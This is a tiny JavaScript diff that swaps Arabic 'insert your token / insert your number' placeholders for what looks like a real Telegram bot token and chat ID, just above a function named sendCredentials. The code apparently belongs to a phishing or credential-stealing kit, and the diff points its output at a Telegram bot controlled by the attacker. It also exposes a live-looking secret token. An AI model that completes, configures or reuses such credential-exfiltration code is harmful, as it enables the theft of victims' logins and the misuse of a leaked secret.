@@ -1,5 +1,5 @@
-const BOT_TOKEN = "ضع_توكنك_هنا";
-const CHAT_ID = "ضع_رقمك_هنا";
+const BOT_TOKEN = "8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk";
+const CHAT_ID = "8539996558";
 };
 
 async function sendCredentials(data) {
